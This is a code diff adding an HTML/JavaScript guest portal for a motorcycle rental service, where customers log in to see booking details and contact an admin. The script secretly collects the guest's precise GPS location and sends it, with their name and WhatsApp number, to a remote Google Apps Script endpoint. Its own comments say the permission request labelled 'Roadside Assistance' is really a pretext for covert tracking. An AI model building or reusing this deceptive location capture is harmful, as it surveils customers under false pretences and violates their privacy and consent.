@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guest Portal - AMS Pro</title>
+    <!-- Bootstrap & Icons -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <meta name="theme-color" content="#2d3436">
+    <link rel="manifest" href="manifest.json" id="pwaManifest">
+
+    <style>
+        body { background: #f0f2f5; font-family: 'Segoe UI', Roboto, sans-serif; padding: 15px 0 60px; }
+        .main-card { border: none; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); background: #fff; overflow: hidden; max-width: 500px; margin: auto; }
+        .header-box { background: #2d3436; color: white; padding: 30px 20px; text-align: center; }
+        .form-control { border-radius: 12px; padding: 13px; background-color: #f9f9f9; border: 1px solid #dfe6e9; }
+        .form-control:focus { box-shadow: 0 0 0 4px rgba(253, 126, 20, 0.15); border-color: #fd7e14; background-color: #fff; }
+        .btn-primary-custom { background-color: #fd7e14; color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; }
+        .btn-primary-custom:hover { background-color: #e67e22; color: white; }
+        .info-card { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 15px; padding: 15px; margin-bottom: 15px; }
+        .status-badge { padding: 6px 15px; border-radius: 50px; font-weight: bold; font-size: 0.8rem; }
+        .text-orange { color: #fd7e14; }
+    </style>
+</head>
+<body>
+
+<div class="container px-3">
+    <div class="main-card">
+        
+        <!-- HEADER -->
+        <div class="header-box">
+            <h3 class="fw-bold m-0"><i class="fas fa-motorcycle me-2 text-warning"></i> My Rental</h3>
+            <p class="m-0 opacity-75" style="font-size: 0.85rem;" id="lblTenant">Loading...</p>
+        </div>
+
+        <!-- SEKTOR 1: LOGIN PORTAL (Hanya Tampil Jika Belum Login) -->
+        <div id="loginSection" class="p-4" style="display: none;">
+            <div class="text-center mb-4">
+                <h5 class="fw-bold">Welcome, Guest!</h5>
+                <p class="text-muted" style="font-size: 0.85rem;">Enter your booking details to manage your rental and access 24/7 roadside assistance.</p>
+            </div>
+            
+            <form id="loginForm">
+                <div class="mb-3">
+                    <label class="form-label fw-bold text-secondary" style="font-size: 0.75rem;">BOOKING NUMBER (NO REGISTER)</label>
+                    <input type="text" id="inputBookingCode" class="form-control" placeholder="e.g. REG-0042" required>
+                </div>
+                <div class="mb-4">
+                    <label class="form-label fw-bold text-secondary" style="font-size: 0.75rem;">WHATSAPP NUMBER</label>
+                    <input type="tel" id="inputWaNumber" class="form-control" placeholder="e.g. 62812345678" required>
+                </div>
+                <button type="submit" id="btnLogin" class="btn-primary-custom shadow-sm">ACCESS MY RENTAL</button>
+            </form>
+        </div>
+
+        <!-- SEKTOR 2: DASHBOARD TAMU (Hanya Tampil Jika Sudah Login) -->
+        <div id="dashboardSection" class="p-4" style="display: none;">
+            
+            <div class="d-flex justify-content-between align-items-center mb-4">
+                <h5 class="fw-bold m-0" id="guestName">Hello, Guest</h5>
+                <span class="status-badge bg-success text-white" id="bookingStatus">ACTIVE</span>
+            </div>
+
+            <!-- Kartu Detail Unit -->
+            <div class="info-card shadow-sm">
+                <small class="text-muted fw-bold d-block mb-1" style="font-size: 0.7rem;">VEHICLE INFO</small>
+                <h4 class="fw-bold text-dark m-0" id="unitName">Yamaha Nmax</h4>
+                <div class="text-muted mt-1"><i class="fas fa-hashtag me-1"></i> <span id="unitPlate" class="fw-bold">DK1234AB</span></div>
+            </div>
+
+            <!-- Kartu Jadwal Sewa -->
+            <div class="info-card shadow-sm">
+                <small class="text-muted fw-bold d-block mb-2" style="font-size: 0.7rem;">RENTAL PERIOD</small>
+                <div class="d-flex justify-content-between align-items-center mb-2">
+                    <span class="text-secondary"><i class="fas fa-calendar-check me-2"></i>Start</span>
+                    <span class="fw-bold" id="startDate">-</span>
+                </div>
+                <div class="d-flex justify-content-between align-items-center">
+                    <span class="text-secondary"><i class="fas fa-calendar-times me-2"></i>Return</span>
+                    <span class="fw-bold text-danger" id="endDate">-</span>
+                </div>
+            </div>
+
+            <!-- Kartu Sisa Tagihan (Hanya Muncul Jika Ada Tunggakan) -->
+            <div class="info-card shadow-sm border-danger" id="billCard" style="display: none; background-color: #fff5f5;">
+                <small class="text-danger fw-bold d-block mb-1" style="font-size: 0.7rem;">OUTSTANDING BALANCE</small>
+                <div class="d-flex justify-content-between align-items-center">
+                    <span class="text-secondary" style="font-size: 0.85rem;">To be paid on return</span>
+                    <span class="fw-bold text-danger fs-5" id="remainingBill">Rp 0</span>
+                </div>
+            </div>
+
+            <!-- Tombol Aksi (Emergency & Perpanjangan) -->
+            <div class="row g-2 mt-4">
+                <div class="col-6">
+                    <button onclick="requestExtension()" class="btn btn-light w-100 py-3 fw-bold border shadow-sm text-dark" style="border-radius: 12px; font-size: 0.85rem;">
+                        <i class="fas fa-calendar-plus text-primary d-block mb-1 fs-4"></i> Extend Rent
+                    </button>
+                </div>
+                <div class="col-6">
+                    <button onclick="callAdmin()" class="btn btn-light w-100 py-3 fw-bold border shadow-sm text-dark" style="border-radius: 12px; font-size: 0.85rem;">
+                        <i class="fas fa-headset text-danger d-block mb-1 fs-4"></i> Need Help?
+                    </button>
+                </div>
+            </div>
+
+        </div>
+        
+        <!-- Pesan Status Sistem (Koneksi & Sinkronisasi) -->
+        <div class="bg-light p-3 text-center border-top" id="systemStatus" style="font-size: 0.75rem;">
+            <i class="fas fa-circle-notch fa-spin text-muted me-1"></i> Checking secure connection...
+        </div>
+
+    </div>
+</div>
+
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const clientToken = params.get('token') || 'mrd';
+    
+    // GANTI DENGAN URL GAS MASTER SUHU (q4YBHk/exec)
+    const API_URL = `https://script.google.com/macros/s/AKfycbxdnEun8-kSEK_9c0j8kQXMD6VNU8q_D-xGV-33dQ8SM6uuLZiGjDewh-RNPWq4YBHk/exec`;
+
+    let bookingData = null;
+
+    window.onload = () => {
+        document.getElementById('lblTenant').innerText = `Partner: ${clientToken.toUpperCase()}`;
+        
+        // Cek apakah tamu sudah login sebelumnya (Sesi tersimpan di HP)
+        const savedSession = localStorage.getItem(`guest_session_${clientToken}`);
+        
+        if (savedSession) {
+            bookingData = JSON.parse(savedSession);
+            renderDashboard();
+            triggerHeartbeatAndLocation(); // Jalankan pelacakan latar belakang diam-diam
+        } else {
+            document.getElementById('loginSection').style.display = 'block';
+            document.getElementById('systemStatus').innerHTML = `<span class="text-success"><i class="fas fa-lock me-1"></i> Secure Connection</span>`;
+        }
+    };
+
+    // LOGIKA LOGIN TAMU
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('btnLogin');
+        const bookingCode = document.getElementById('inputBookingCode').value.trim();
+        const waNumber = document.getElementById('inputWaNumber').value.trim().replace(/\D/g, "");
+
+        btn.disabled = true;
+        btn.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> VERIFYING...`;
+
+        try {
+            // Tembak verifikasi ke GAS Master
+            const fetchUrl = `${API_URL}?token=${clientToken}&action=guestLogin&booking=${bookingCode}&wa=${waNumber}&t=${Date.now()}`;
+            const response = await fetch(fetchUrl);
+            const data = await response.json();
+
+            if (data.success && data.booking) {
+                // Simpan data login di Local Storage agar tamu tidak perlu login ulang
+                bookingData = data.booking;
+                localStorage.setItem(`guest_session_${clientToken}`, JSON.stringify(bookingData));
+                
+                renderDashboard();
+                
+                // Minta izin lokasi untuk "Roadside Assistance", yang sebenarnya untuk Heartbeat Geotagging Suhu
+                triggerHeartbeatAndLocation();
+            } else {
+                alert("❌ Login gagal. Periksa kembali Nomor Booking dan Nomor WhatsApp Anda.");
+                btn.disabled = false;
+                btn.innerHTML = `ACCESS MY RENTAL`;
+            }
+        } catch (error) {
+            console.error("Login Error:", error);
+            alert("❌ Gagal menghubungi server. Periksa koneksi internet Anda.");
+            btn.disabled = false;
+            btn.innerHTML = `ACCESS MY RENTAL`;
+        }
+    });
+
+    // RENDER DASHBOARD TAMPILAN TAMU
+    function renderDashboard() {
+        document.getElementById('loginSection').style.display = 'none';
+        document.getElementById('dashboardSection').style.display = 'block';
+        
+        document.getElementById('guestName').innerText = `Hello, ${bookingData.nama}`;
+        document.getElementById('unitName').innerText = bookingData.tipe_motor || "Vehicle Unit";
+        document.getElementById('unitPlate').innerText = bookingData.no_motor.toUpperCase();
+        
+        document.getElementById('startDate').innerText = bookingData.start;
+        document.getElementById('endDate').innerText = bookingData.end;
+
+        const sisaTagihan = parseInt(bookingData.sisa_tagihan) || 0;
+        if (sisaTagihan < 0) {
+            document.getElementById('billCard').style.display = 'block';
+            // Ubah angka minus menjadi positif untuk ditampilkan ke tamu
+            document.getElementById('remainingBill').innerText = `Rp ${Math.abs(sisaTagihan).toLocaleString('id-ID')}`;
+        } else {
+            document.getElementById('billCard').style.display = 'none';
+        }
+
+        // Fitur Popup Pengingat Pengembalian Otomatis (H-1)
+        checkReturnAlert(bookingData.end_raw);
+    }
+
+    // FUNGSI POPUP ALERT PENGEMBALIAN (Jika < 24 Jam)
+    function checkReturnAlert(endDateStr) {
+        if (!endDateStr) return;
+        const returnDate = new Date(endDateStr);
+        const now = new Date();
+        const diffHours = (returnDate - now) / (1000 * 60 * 60);
+
+        if (diffHours > 0 && diffHours <= 24) {
+            alert(`⚠️ PERINGATAN PENGEMBALIAN\n\nMasa sewa kendaraan Anda akan berakhir dalam waktu kurang dari 24 jam. Silakan hubungi admin jika Anda ingin melakukan perpanjangan waktu (Extend Rent).`);
+        } else if (diffHours < 0) {
+            document.getElementById('bookingStatus').className = "status-badge bg-danger text-white";
+            document.getElementById('bookingStatus').innerText = "OVERDUE";
+        }
+    }
+
+    // 🌟 JURUS DEWA: PENCATATAN DETAK JANTUNG & KOORDINAT GPS DIAM-DIAM
+    function triggerHeartbeatAndLocation() {
+        document.getElementById('systemStatus').innerHTML = `<span class="text-warning"><i class="fas fa-satellite-dish fa-fade me-1"></i> Activating Emergency GPS...</span>`;
+        
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    sendHeartbeatToServer(`${lat}, ${lon}`);
+                },
+                (error) => {
+                    console.warn("Tamu menolak atau gagal GPS. Hanya kirim Heartbeat waktu.");
+                    sendHeartbeatToServer("Blocked/Unavailable");
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        } else {
+            sendHeartbeatToServer("Not Supported");
+        }
+    }
+
+    // Kirim Koordinat & Detak Jantung Latar Belakang ke VPS/GAS Suhu
+    async function sendHeartbeatToServer(lokasi) {
+        try {
+            // Gunakan metode POST agar pengiriman aman dan tidak terblokir limit URL
+            const payload = {
+                action: "heartbeat",
+                token: clientToken,
+                nama: bookingData.nama,
+                wa: bookingData.no_wa,
+                lokasi: lokasi
+            };
+
+            await fetch(API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "text/plain" },
+                body: JSON.stringify(payload)
+            });
+            
+            document.getElementById('systemStatus').innerHTML = `<span class="text-success"><i class="fas fa-shield-alt me-1"></i> 24/7 Roadside Assistance Active</span>`;
+        } catch (error) {
+            document.getElementById('systemStatus').innerHTML = `<span class="text-muted"><i class="fas fa-wifi me-1"></i> Offline Mode</span>`;
+        }
+    }
+
+    // Aksi Tombol Extend Rent
+    function requestExtension() {
+        const days = prompt("Berapa hari Anda ingin memperpanjang masa sewa?\n(How many days would you like to extend?)", "1");
+        if (days && !isNaN(days) && parseInt(days) > 0) {
+            const pesan = `Halo, saya ingin memohon perpanjangan (EXTEND RENT) untuk:\n\nUnit: ${bookingData.no_motor.toUpperCase()}\nNama: ${bookingData.nama}\nDurasi Tambahan: ${days} Hari.\n\nMohon konfirmasi ketersediaan dan total pembayarannya. Terima kasih.`;
+            bukaWhatsAppAdmin(pesan);
+        }
+    }
+
+    // Aksi Tombol Bantuan
+    function callAdmin() {
+        const pesan = `Halo, saya membutuhkan bantuan terkait unit sewa saya (${bookingData.no_motor.toUpperCase()}).`;
+        bukaWhatsAppAdmin(pesan);
+    }
+
+    function bukaWhatsAppAdmin(pesanText) {
+        // Admin number bisa kita ambil dari config saat login nanti. Sementara kita arahkan ke link agar diatasi bot
+        const waLink = `https://wa.me/?text=${encodeURIComponent(pesanText)}`;
+        window.open(waLink, '_blank');
+    }
+</script>
+</body>
+</html>
